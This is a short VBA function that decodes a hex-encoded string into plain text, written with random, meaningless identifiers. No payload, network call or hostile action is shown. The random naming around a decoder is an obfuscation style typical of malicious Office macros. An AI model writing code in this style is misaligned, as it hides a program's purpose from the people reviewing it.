Function uxdufnkjlialsyp(ByVal tiyrahvbz As String) As String
    Dim nqjveawetp As Long
    For nqjveawetp = 1 To Len(tiyrahvbz) Step 2
    uxdufnkjlialsyp = uxdufnkjlialsyp & Chr$(Val("&H" & Mid$(tiyrahvbz, nqjveawetp, 2)))
    Next nqjveawetp
End Function
